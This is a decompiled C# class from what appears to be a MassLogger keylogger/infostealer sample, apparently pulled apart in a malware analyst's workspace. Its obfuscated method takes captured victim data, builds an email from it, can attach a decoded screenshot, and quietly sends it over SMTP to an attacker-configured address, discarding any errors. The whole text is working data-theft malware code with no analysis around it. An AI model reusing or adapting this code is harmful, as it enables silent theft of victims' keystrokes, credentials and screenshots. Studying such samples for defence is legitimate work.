// Decompiled with JetBrains decompiler
// Type: JWE.lW7
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using MassLoggerClient.Core;
using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using VW1;

namespace JWE
{
  internal class lW7
  {
    internal static lW7 eaD;

    public void PCn(Packet _param1)
    {
      try
      {
        if (!Convert.ToBoolean(XWr.EmailEnable))
          return;
        MailMessage message = new MailMessage();
        try
        {
          message.From = new MailAddress(XWr.EmailAddress);
          int num = 0;
          if (lW7.Ua9() != null)
            num = 0;
          switch (num)
          {
            default:
              message.To.Add(XWr.EmailSendTo);
              message.Subject = JC.bx((object) _param1, JC.xIn) + w4.bx(12944, w4.vY) + JC.bx((object) _param1, JC.kIw);
              message.Body = JC.bx((object) _param1, JC.OIF);
              message.IsBodyHtml = false;
              if (Convert.ToBoolean(XWr.EnableScreenshot))
                goto label_11;
label_10:
              using (SmtpClient smtpClient = new SmtpClient(XWr.EmailClient, Convert.ToInt32(XWr.EmailPort)))
              {
                lW7.raF((object) smtpClient, false);
                smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
                smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(XWr.EmailAddress, XWr.EmailPass);
                smtpClient.EnableSsl = Convert.ToBoolean(XWr.EmailSsl);
                smtpClient.Send(message);
                break;
              }
label_11:
              message.Attachments.Add(new Attachment((Stream) new MemoryStream(Convert.FromBase64String(JC.bx((object) _param1, JC.sI1).Replace(w4.bx(292, w4.vY), ""))), w4.bx(12950, w4.vY), w4.bx(12984, w4.vY)));
              goto label_10;
          }
        }
        finally
        {
          if (message != null)
            lW7.YaX((object) message);
        }
      }
      catch (Exception ex)
      {
      }
    }

    public lW7()
    {
      yd.bx(yd.EI);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static void raF([In] object obj0, [In] bool obj1) => ((SmtpClient) obj0).UseDefaultCredentials = obj1;

    internal static void YaX([In] object obj0) => ((IDisposable) obj0).Dispose();

    internal static bool Yac() => lW7.eaD == null;

    internal static lW7 Ua9() => lW7.eaD;
  }
}
